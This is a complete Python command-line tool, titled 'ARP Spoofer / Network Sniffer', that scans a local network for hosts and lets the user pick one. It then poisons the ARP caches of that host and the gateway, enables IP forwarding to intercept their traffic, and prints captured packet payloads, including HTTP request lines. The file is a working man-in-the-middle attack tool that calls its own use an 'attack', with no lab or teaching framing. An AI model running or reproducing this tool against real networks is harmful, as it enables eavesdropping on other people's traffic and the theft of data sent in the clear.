import threading
import time
import socket
import sys
import os
import re
import queue
import platform
import subprocess
import ipaddress
import concurrent.futures
import hashlib
from time import sleep
from datetime import datetime
import psutil

# Fix for Scapy import issue - import specific modules first
import scapy.config
import scapy.route

# Now import the rest
from scapy.all import ARP, Ether, sendp, sniff, srp
from scapy.arch import get_if_hwaddr, get_if_addr
import scapy.all as scapy

# Configure Scapy to avoid the interface detection issue
scapy.config.conf.iface = None  # Let Scapy figure it out later

try:
    import requests
except ImportError:
    requests = None

# Color codes for terminal output
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def get_available_interfaces():
    return [iface for iface in psutil.net_if_addrs().keys() if not iface.lower().startswith('loopback')]

def get_default_interface():
    try:
        stats = psutil.net_if_stats()
    except Exception:
        pass
    interfaces = get_available_interfaces()
    return interfaces[0] if interfaces else ''

def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(('8.8.8.8', 80))
        ip = s.getsockname()[0]
    except Exception:
        ip = None
    finally:
        s.close()
    return ip

def guess_net(ip, prefix=24):
    return str(ipaddress.ip_network(f'{ip}/{prefix}', strict=False))

def arp_scan_scapy(cidr):
    try:
        # Configure Scapy for this specific scan
        scapy.config.conf.verb = 0
        
        # Create and send ARP request
        arp = ARP(pdst=cidr)
        ether = Ether(dst='ff:ff:ff:ff:ff:ff')
        packet = ether / arp
        
        # Send packet and receive response
        answered, _ = srp(packet, timeout=2, retry=1, verbose=False)
        
        results = []
        for _, r in answered:
            results.append({'ip': r.psrc, 'mac': r.hwsrc.lower()})
        return results
    except Exception as e:
        raise RuntimeError(f'Scapy ARP scan failed: {e}') from e

def ping_once(ip):
    system = platform.system().lower()
    if system == 'windows':
        cmd = ['ping', '-n', '1', '-w', '1000', ip]
    else:
        cmd = ['ping', '-c', '1', '-W', '1', ip]
    try:
        subprocess.check_output(cmd, stderr=subprocess.DEVNULL, timeout=2)
    except (subprocess.CalledProcessError, subprocess.TimeoutExpired):
        return False
    except Exception:
        return False
    return True

def parse_arp_table():
    system = platform.system().lower()
    entries = []
    try:
        if system == 'windows':
            out = subprocess.check_output(['arp', '-a'], text=True, stderr=subprocess.DEVNULL)
            for line in out.splitlines():
                m = re.search(r'(\d+\.\d+\.\d+\.\d+)\s+([0-9a-f]{2}-[0-9a-f]{2}-[0-9a-f]{2}-[0-9a-f]{2}-[0-9a-f]{2}-[0-9a-f]{2})', line, re.I)
                if m:
                    ip = m.group(1)
                    mac = m.group(2).replace('-', ':').lower()
                    entries.append({'ip': ip, 'mac': mac})
        else:
            # Try multiple methods for Linux
            try:
                # Method 1: arp -n
                out = subprocess.check_output(['arp', '-n'], text=True, stderr=subprocess.DEVNULL)
                for line in out.splitlines():
                    m = re.search(r'(\d+\.\d+\.\d+\.\d+).*?((?:[0-9a-f]{2}:){5}[0-9a-f]{2})', line, re.I)
                    if m:
                        ip = m.group(1)
                        mac = m.group(2).lower()
                        entries.append({'ip': ip, 'mac': mac})
            except:
                # Method 2: ip neigh
                try:
                    out = subprocess.check_output(['ip', 'neigh'], text=True, stderr=subprocess.DEVNULL)
                    for line in out.splitlines():
                        m = re.search(r'(\d+\.\d+\.\d+\.\d+).*?((?:[0-9a-f]{2}:){5}[0-9a-f]{2})', line, re.I)
                        if m:
                            ip = m.group(1)
                            mac = m.group(2).lower()
                            entries.append({'ip': ip, 'mac': mac})
                except:
                    pass
    except Exception:
        pass
    return entries

def sweep_network_ping(cidr, max_workers=200):
    try:
        net = ipaddress.ip_network(cidr, strict=False)
        hosts = [str(ip) for ip in net.hosts()]
        if len(hosts) > 1024:
            hosts = hosts[:1024]
        
        alive = []
        with concurrent.futures.ThreadPoolExecutor(max_workers=min(max_workers, 500)) as ex:
            futures = {ex.submit(ping_once, ip): ip for ip in hosts}
            for fut in concurrent.futures.as_completed(futures):
                try:
                    ip = futures[fut]
                    if fut.result():
                        alive.append(ip)
                except Exception:
                    continue
        
        arp_entries = parse_arp_table()
        arp_map = {e['ip']: e['mac'] for e in arp_entries}
        return [{'ip': ip, 'mac': arp_map.get(ip)} for ip in alive]
    except Exception:
        return []

def reverse_dns(ip, timeout=1.5):
    try:
        with concurrent.futures.ThreadPoolExecutor(max_workers=1) as ex:
            fut = ex.submit(socket.gethostbyaddr, ip)
            try:
                name = fut.result(timeout=timeout)[0]
                return name
            except concurrent.futures.TimeoutError:
                return None
            except Exception:
                return None
    except Exception:
        return None

def netbios_name_lookup(ip):
    try:
        system = platform.system().lower()
        if system == 'windows':
            try:
                out = subprocess.check_output(['nbtstat', '-A', ip], text=True, stderr=subprocess.DEVNULL)
                m = re.search(r'<20>\s+UNIQUE\s+<(.+?)>', out)
                if m:
                    return m.group(1)
                m2 = re.search(r'^\s*(\S+)\s+<00>\s+UNIQUE', out, re.M)
                if m2:
                    return m2.group(1)
                return None
            except Exception:
                return None
        else:
            # Try multiple methods for Linux
            try:
                out = subprocess.check_output(['nmblookup', '-A', ip], text=True, stderr=subprocess.DEVNULL, timeout=2)
                for line in out.splitlines():
                    line = line.strip()
                    m = re.match(r'^(\S+)\s+<\w+>\s+(\w+)', line)
                    if m:
                        return m.group(1)
            except Exception:
                pass
            
            try:
                out2 = subprocess.check_output(['avahi-resolve-address', ip], text=True, stderr=subprocess.DEVNULL, timeout=2)
                parts = out2.split()
                if len(parts) >= 2:
                    return parts[1]
            except Exception:
                pass
            
            return None
    except Exception:
        return None

def get_vendor_from_mac_api(mac):
    try:
        if not mac or not requests:
            return None
        mac_clean = mac.strip().upper()
        # Remove colons/dashes
        mac_clean = re.sub(r'[:-]', '', mac_clean)
        url = f'https://api.macvendors.com/{mac_clean}'
        r = requests.get(url, timeout=3)
        if r.status_code == 200 and r.text:
            return r.text.strip()
        return None
    except Exception:
        return None

def enrich_entry(entry):
    ip = entry.get('ip')
    mac = entry.get('mac')
    res = {'ip': ip, 'mac': mac, 'hostname': None, 'netbios': None, 'vendor': None}
    
    if ip:
        res['hostname'] = reverse_dns(ip)
        res['netbios'] = netbios_name_lookup(ip)
    
    if mac:
        res['vendor'] = get_vendor_from_mac_api(mac)
    
    return res

class ARPSpoofer:
    def __init__(self):
        self.stop_event = threading.Event()
        self.interfaces = get_available_interfaces()
        default_iface = get_default_interface()
        self.config = {
            'target_ip': '',
            'gateway_ip': '',
            'target_mac': '',
            'gateway_mac': '',
            'iface': default_iface if default_iface in self.interfaces else self.interfaces[0] if self.interfaces else '',
            'sniff_all': False,
            'protocols': ['HTTP', 'TCP', 'UDP', 'OTHER']
        }
        self.local_mac = None
        self.local_ip = None
        self.attack_thread = None
        self.capture_thread = None
        self.packet_count = 0
        
    def clear_screen(self):
        os.system('cls' if os.name == 'nt' else 'clear')
    
    def print_banner(self):
        banner = f"""
{Colors.GREEN}{Colors.BOLD}
╔══════════════════════════════════════════════════════════╗
║                 ARP SPOOFER / NETWORK SNIFFER            ║
║                      Command Line Version                ║
╚══════════════════════════════════════════════════════════╝{Colors.ENDC}
        """
        print(banner)
    
    def print_status(self, message, level="INFO"):
        timestamp = datetime.now().strftime('%H:%M:%S')
        if level == "INFO":
            color = Colors.CYAN
        elif level == "SUCCESS":
            color = Colors.GREEN
        elif level == "WARNING":
            color = Colors.WARNING
        elif level == "ERROR":
            color = Colors.FAIL
        elif level == "SPOOF":
            color = Colors.BLUE
        else:
            color = Colors.ENDC
        
        print(f"{color}[{timestamp}] [{level}] {message}{Colors.ENDC}")
    
    def detect_gateway(self):
        gw_ip = None
        try:
            if platform.system() == 'Windows':
                routes = subprocess.check_output('route print', shell=True).decode('mbcs', errors='ignore')
                for line in routes.splitlines():
                    m = re.match(r'\s*0\.0\.0\.0\s+0\.0\.0\.0\s+([0-9]{1,3}(?:\.[0-9]{1,3}){3})\s', line)
                    if m:
                        gw_ip = m.group(1)
                        return gw_ip
            else:
                # Try multiple methods for Linux
                try:
                    result = subprocess.check_output(['ip', 'route'], text=True)
                    m = re.search(r'default via ([0-9]{1,3}(?:\.[0-9]{1,3}){3})', result)
                    if m:
                        gw_ip = m.group(1)
                        return gw_ip
                except:
                    pass
                
                try:
                    result = subprocess.check_output(['route', '-n'], text=True)
                    for line in result.splitlines():
                        if line.startswith('0.0.0.0'):
                            parts = line.split()
                            if len(parts) >= 2:
                                gw_ip = parts[1]
                                return gw_ip
                except:
                    pass
        except Exception:
            pass
        return gw_ip

    def find_mac_for_ip(self, ip):
        try:
            if platform.system() == 'Windows':
                result = subprocess.check_output('arp -a', shell=True).decode('mbcs', errors='ignore')
            else:
                # Try multiple methods
                try:
                    result = subprocess.check_output(['arp', '-n'], text=True)
                except:
                    result = subprocess.check_output(['ip', 'neigh'], text=True)
            
            for line in result.splitlines():
                if ip in line:
                    mac = re.search(r'([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})', line)
                    if mac:
                        return mac.group(0).replace('-', ':').lower()
        except Exception:
            return ''
        return ''
    
    def detect_network(self):
        try:
            # Get interface info
            self.local_ip = get_if_addr(self.config['iface'])
            self.local_mac = get_if_hwaddr(self.config['iface'])
            self.print_status(f"Interface used: {self.config['iface']}", "SUCCESS")
            self.print_status(f"Local IP: {self.local_ip}", "SUCCESS")
            self.print_status(f"Local MAC: {self.local_mac}", "SUCCESS")
            
            # Detect gateway
            gw_ip = self.detect_gateway()
            if gw_ip:
                self.config['gateway_ip'] = gw_ip
                self.print_status(f"Gateway IP: {gw_ip}", "SUCCESS")
                gw_mac = self.find_mac_for_ip(gw_ip)
                if gw_mac:
                    self.config['gateway_mac'] = gw_mac
                    self.print_status(f"Gateway MAC: {gw_mac}", "SUCCESS")
                else:
                    self.print_status("Could not find gateway MAC - you may need to specify it manually", "WARNING")
            else:
                self.print_status("Could not find gateway IP via routing - you may need to specify it manually", "WARNING")
        except Exception as e:
            self.print_status(f"Network detection error: {e}", "ERROR")
    
    def scan_ip_targets(self):
        try:
            local_ip = get_local_ip()
            if not local_ip:
                self.print_status("Could not determine local IP", "ERROR")
                return []
            
            cidr = guess_net(local_ip, prefix=24)
            self.print_status(f"Scanning network: {cidr}", "INFO")
            results = []
            
            try:
                results = arp_scan_scapy(cidr)
                self.print_status(f"ARP scan (scapy): {len(results)} hosts found", "SUCCESS")
            except Exception as e:
                self.print_status(f"Scapy scan failed: {e}, falling back to ping sweep", "WARNING")
                results = sweep_network_ping(cidr)
                self.print_status(f"Ping sweep: {len(results)} responsive hosts found", "INFO")
            
            # Enrich results with DNS and vendor info
            enriched = []
            with concurrent.futures.ThreadPoolExecutor(max_workers=50) as ex:
                futures = [ex.submit(enrich_entry, r) for r in results]
                for fut in concurrent.futures.as_completed(futures):
                    try:
                        enriched.append(fut.result())
                    except Exception:
                        pass
            
            enriched_sorted = sorted(enriched, key=lambda x: x.get('ip') or '')
            return enriched_sorted
        except Exception as e:
            self.print_status(f"Target IP scan error: {e}", "ERROR")
            return []
    
    def display_targets(self, targets):
        if not targets:
            self.print_status("No target devices detected on the network", "WARNING")
            return
        
        print(f"\n{Colors.BOLD}{Colors.GREEN}Available Targets:{Colors.ENDC}")
        print(f"{'ID':<4} {'IP':<16} {'MAC':<18} {'Hostname':<30} {'Vendor':<20}")
        print("-" * 90)
        
        for i, e in enumerate(targets):
            ip = e.get('ip') or '-'
            mac = e.get('mac') or '-'
            hn = (e.get('hostname') or '-')[:28]
            vendor = (e.get('vendor') or '-')[:18]
            print(f"{i:<4} {ip:<16} {mac:<18} {hn:<30} {vendor:<20}")
        print()
    
    def validate_ip(self, ip):
        try:
            ipaddress.ip_address(ip)
            return True
        except:
            return False
    
    def validate_mac(self, mac):
        return bool(re.match(r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$', mac))
    
    def interactive_config(self):
        self.clear_screen()
        self.print_banner()
        
        # Interface selection
        print(f"\n{Colors.BOLD}Available interfaces:{Colors.ENDC}")
        for i, iface in enumerate(self.interfaces):
            print(f"  {i+1}. {iface}")
        
        while True:
            try:
                choice = input(f"\n{Colors.CYAN}Select interface (1-{len(self.interfaces)}) [Default: 1]: {Colors.ENDC}").strip()
                if not choice:
                    idx = 0
                else:
                    idx = int(choice) - 1
                
                if 0 <= idx < len(self.interfaces):
                    self.config['iface'] = self.interfaces[idx]
                    break
                else:
                    print(f"{Colors.FAIL}Invalid selection{Colors.ENDC}")
            except ValueError:
                print(f"{Colors.FAIL}Please enter a number{Colors.ENDC}")
        
        # Auto-detect network
        self.detect_network()
        
        # Scan for targets
        targets = self.scan_ip_targets()
        
        if targets:
            self.display_targets(targets)
            
            # Mode selection
            print(f"\n{Colors.BOLD}Select mode:{Colors.ENDC}")
            print("  1. Sniff entire network")
            print("  2. Target specific device (ARP spoofing)")
            
            while True:
                mode = input(f"\n{Colors.CYAN}Select mode (1-2) [Default: 2]: {Colors.ENDC}").strip()
                if not mode or mode == "2":
                    self.config['sniff_all'] = False
                    
                    # Select target
                    while True:
                        try:
                            target_id = input(f"{Colors.CYAN}Select target ID (0-{len(targets)-1}): {Colors.ENDC}").strip()
                            if target_id and 0 <= int(target_id) < len(targets):
                                target = targets[int(target_id)]
                                self.config['target_ip'] = target['ip']
                                self.config['target_mac'] = target['mac'] or ''
                                break
                            else:
                                print(f"{Colors.FAIL}Invalid target ID{Colors.ENDC}")
                        except ValueError:
                            print(f"{Colors.FAIL}Please enter a number{Colors.ENDC}")
                    
                    break
                elif mode == "1":
                    self.config['sniff_all'] = True
                    break
                else:
                    print(f"{Colors.FAIL}Invalid mode{Colors.ENDC}")
        else:
            # Manual configuration
            self.print_status("No targets auto-detected, switching to manual mode", "WARNING")
            
            print(f"\n{Colors.BOLD}Manual Configuration:{Colors.ENDC}")
            
            # Ask if user wants to sniff all or target specific
            print(f"\n{Colors.BOLD}Select mode:{Colors.ENDC}")
            print("  1. Sniff entire network")
            print("  2. Target specific device (ARP spoofing)")
            
            mode = input(f"\n{Colors.CYAN}Select mode (1-2) [Default: 2]: {Colors.ENDC}").strip()
            self.config['sniff_all'] = (mode == "1")
            
            if not self.config['sniff_all']:
                # Target IP
                while True:
                    ip = input(f"{Colors.CYAN}Target IP: {Colors.ENDC}").strip()
                    if self.validate_ip(ip):
                        self.config['target_ip'] = ip
                        break
                    print(f"{Colors.FAIL}Invalid IP address{Colors.ENDC}")
                
                # Target MAC
                while True:
                    mac = input(f"{Colors.CYAN}Target MAC (format: aa:bb:cc:dd:ee:ff) [optional, press Enter to skip]: {Colors.ENDC}").strip()
                    if not mac:
                        break
                    if self.validate_mac(mac):
                        self.config['target_mac'] = mac
                        break
                    print(f"{Colors.FAIL}Invalid MAC address{Colors.ENDC}")
                
                # Gateway IP
                while True:
                    ip = input(f"{Colors.CYAN}Gateway IP: {Colors.ENDC}").strip()
                    if self.validate_ip(ip):
                        self.config['gateway_ip'] = ip
                        break
                    print(f"{Colors.FAIL}Invalid IP address{Colors.ENDC}")
                
                # Gateway MAC
                while True:
                    mac = input(f"{Colors.CYAN}Gateway MAC (format: aa:bb:cc:dd:ee:ff) [optional, press Enter to skip]: {Colors.ENDC}").strip()
                    if not mac:
                        break
                    if self.validate_mac(mac):
                        self.config['gateway_mac'] = mac
                        break
                    print(f"{Colors.FAIL}Invalid MAC address{Colors.ENDC}")
        
        # Protocol selection
        print(f"\n{Colors.BOLD}Select protocols to capture (comma-separated):{Colors.ENDC}")
        print("  Available: HTTP, TCP, UDP, OTHER")
        proto_input = input(f"{Colors.CYAN}Protocols [Default: HTTP,TCP,UDP,OTHER]: {Colors.ENDC}").strip()
        if proto_input:
            self.config['protocols'] = [p.strip().upper() for p in proto_input.split(',') if p.strip().upper() in ['HTTP', 'TCP', 'UDP', 'OTHER']]
        if not self.config['protocols']:
            self.config['protocols'] = ['HTTP', 'TCP', 'UDP', 'OTHER']
    
    def arp_poison(self):
        try:
            # Create ARP packets
            target = ARP(op=2, pdst=self.config['target_ip'], hwdst=self.config['target_mac'], psrc=self.config['gateway_ip'])
            gateway = ARP(op=2, pdst=self.config['gateway_ip'], hwdst=self.config['gateway_mac'], psrc=self.config['target_ip'])
            
            # Enable IP forwarding
            if platform.system() != 'Windows':
                try:
                    with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                        f.write('1')
                    self.print_status("IP forwarding enabled", "SUCCESS")
                except:
                    self.print_status("Could not enable IP forwarding - run as root", "WARNING")
            
            spoof_count = 0
            while not self.stop_event.is_set():
                # Send ARP replies
                sendp(Ether() / target, iface=self.config['iface'], verbose=False)
                sendp(Ether() / gateway, iface=self.config['iface'], verbose=False)
                
                spoof_count += 1
                if spoof_count % 10 == 0:  # Print every 10 packets
                    self.print_status(f"ARP spoofing: {self.config['target_ip']} ↔ {self.config['gateway_ip']}", "SPOOF")
                
                for _ in range(10):
                    if self.stop_event.is_set():
                        break
                    time.sleep(0.1)
        except Exception as e:
            self.print_status(f"ARP spoofing error: {e}", "ERROR")

    def packet_capture(self):
        def packet_handler(pkt):
            if self.stop_event.is_set():
                return
            
            if pkt.haslayer('IP'):
                src = pkt['IP'].src
                dst = pkt['IP'].dst
                proto = pkt['IP'].proto
                proto_str = {1: 'ICMP', 6: 'TCP', 17: 'UDP'}.get(proto, 'OTHER')
                
                # Filter by protocol
                if proto_str not in self.config['protocols']:
                    return
                
                # Filter by target if not in sniff_all mode
                if not self.config['sniff_all'] and self.config['target_ip']:
                    if src != self.config['target_ip'] and dst != self.config['target_ip']:
                        return
                
                info = ''
                data = ''
                
                # Extract packet info
                if pkt.haslayer('TCP'):
                    info = f"Port {pkt['TCP'].sport} → {pkt['TCP'].dport}"
                    if pkt.haslayer('Raw'):
                        payload = pkt['Raw'].load[:100]
                        try:
                            data = payload.decode(errors='ignore')
                            # Check for HTTP
                            if data and ('HTTP/' in data or 'GET ' in data or 'POST ' in data):
                                proto_str = 'HTTP'
                                # Show first line of HTTP request/response
                                lines = data.split('\n')
                                if lines:
                                    info = lines[0][:50]
                        except:
                            data = str(payload)[:50]
                elif pkt.haslayer('UDP'):
                    info = f"Port {pkt['UDP'].sport} → {pkt['UDP'].dport}"
                elif pkt.haslayer('ICMP'):
                    info = f"Type {pkt['ICMP'].type}"
                
                self.packet_count += 1
                timestamp = datetime.now().strftime('%H:%M:%S.%f')[:-3]
                
                # Color-code by protocol
                if proto_str == 'HTTP':
                    color = Colors.GREEN
                elif proto_str == 'TCP':
                    color = Colors.CYAN
                elif proto_str == 'UDP':
                    color = Colors.BLUE
                else:
                    color = Colors.WARNING
                
                # Format output
                output = f"{color}[{timestamp}] {src}:{pkt.sport if hasattr(pkt, 'sport') else ''} → {dst}:{pkt.dport if hasattr(pkt, 'dport') else ''} | {proto_str} | {info}"
                if data:
                    output += f" | {data[:50]}"
                print(f"{output}{Colors.ENDC}")
        
        try:
            # Start sniffing
            sniff(iface=self.config['iface'], prn=packet_handler, store=False, stop_filter=lambda x: self.stop_event.is_set())
        except Exception as e:
            self.print_status(f"Capture error: {e}", "ERROR")

    def start(self):
        self.clear_screen()
        self.print_banner()
        
        # Check permissions
        if platform.system() != 'Windows' and hasattr(os, 'geteuid') and os.geteuid() != 0:
            self.print_status("WARNING: Running without root/admin privileges will limit functionality", "WARNING")
            self.print_status("ARP spoofing and packet capture require root privileges", "WARNING")
            response = input(f"{Colors.WARNING}Continue anyway? (y/n): {Colors.ENDC}").strip().lower()
            if response != 'y':
                sys.exit(1)
        
        # Interactive configuration
        self.interactive_config()
        
        # Final confirmation
        print(f"\n{Colors.BOLD}Configuration:{Colors.ENDC}")
        print(f"  Interface: {self.config['iface']}")
        print(f"  Mode: {'Full network sniff' if self.config['sniff_all'] else 'Targeted ARP spoofing'}")
        if not self.config['sniff_all']:
            print(f"  Target IP: {self.config['target_ip']}")
            print(f"  Target MAC: {self.config['target_mac'] or 'Auto-detected'}")
            print(f"  Gateway IP: {self.config['gateway_ip']}")
            print(f"  Gateway MAC: {self.config['gateway_mac'] or 'Auto-detected'}")
        print(f"  Protocols: {', '.join(self.config['protocols'])}")
        
        response = input(f"\n{Colors.CYAN}Start attack? (y/n): {Colors.ENDC}").strip().lower()
        if response != 'y':
            self.print_status("Aborted", "WARNING")
            sys.exit(0)
        
        # Start attack
        self.print_status("Starting attack...", "INFO")
        self.stop_event.clear()
        
        if not self.config['sniff_all'] and self.config['target_ip'] and self.config['gateway_ip']:
            self.attack_thread = threading.Thread(target=self.arp_poison, daemon=True)
            self.attack_thread.start()
            time.sleep(1)  # Give ARP spoofing time to start
        
        self.capture_thread = threading.Thread(target=self.packet_capture, daemon=True)
        self.capture_thread.start()
        
        self.print_status(f"Capture started" + (" with ARP spoofing" if not self.config['sniff_all'] else ""), "SUCCESS")
        print(f"\n{Colors.WARNING}Press Ctrl+C to stop...{Colors.ENDC}\n")
        
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            self.stop()
    
    def stop(self):
        self.print_status("\nStopping attack...", "WARNING")
        self.stop_event.set()
        
        # Restore ARP tables if we were spoofing
        if not self.config['sniff_all'] and self.config['target_ip'] and self.config['gateway_ip']:
            self.print_status("Restoring ARP tables...", "INFO")
            try:
                # Send correct ARP entries to restore
                target_restore = ARP(op=2, pdst=self.config['target_ip'], hwdst='ff:ff:ff:ff:ff:ff', psrc=self.config['gateway_ip'], hwsrc=self.config['gateway_mac'])
                gateway_restore = ARP(op=2, pdst=self.config['gateway_ip'], hwdst='ff:ff:ff:ff:ff:ff', psrc=self.config['target_ip'], hwsrc=self.config['target_mac'])
                
                sendp(Ether() / target_restore, iface=self.config['iface'], verbose=False, count=3)
                sendp(Ether() / gateway_restore, iface=self.config['iface'], verbose=False, count=3)
                
                self.print_status("ARP tables restored", "SUCCESS")
            except Exception as e:
                self.print_status(f"Failed to restore ARP: {e}", "ERROR")
            
            # Disable IP forwarding
            if platform.system() != 'Windows':
                try:
                    with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                        f.write('0')
                except:
                    pass
        
        time.sleep(1)
        self.print_status(f"Total packets captured: {self.packet_count}", "SUCCESS")
        self.print_status("Attack stopped", "INFO")

if __name__ == '__main__':
    spoofer = ARPSpoofer()
    spoofer.start()
